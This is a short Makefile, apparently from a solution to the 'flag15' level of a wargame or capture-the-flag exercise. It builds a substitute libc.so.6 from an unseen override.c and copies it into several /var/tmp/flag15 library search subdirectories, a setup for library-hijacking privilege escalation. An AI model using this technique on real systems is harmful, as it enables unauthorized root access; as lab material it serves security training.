TARGET=libc.so.6 
all: 
        gcc -shared -fpic -static-libgcc -Wl,-soname,$(TARGET),--version-script=override.ld,-Bstatic override.c -o $(TARGET) 
 
         
env: 
        mkdir -p /var/tmp/flag15/tls/i686/sse2/cmov/ 
        mkdir -p /var/tmp/flag15/tls/i686/sse2/cmov/ 
        mkdir -p /var/tmp/flag15/tls/sse2/cmov/ 
        mkdir -p /var/tmp/flag15/i686/sse2/cmov/ 
 
install: 
        cp $(TARGET) /var/tmp/flag15/tls/sse2 
        cp $(TARGET) /var/tmp/flag15/i686/sse2/cmov 
        cp $(TARGET) /var/tmp/flag15/tls/sse2/cmov/ 
        cp $(TARGET) /var/tmp/flag15/tls/i686/sse2/cmov 
 
clean: 
        rm -f $(TARGET) 
        rm -f *.o 
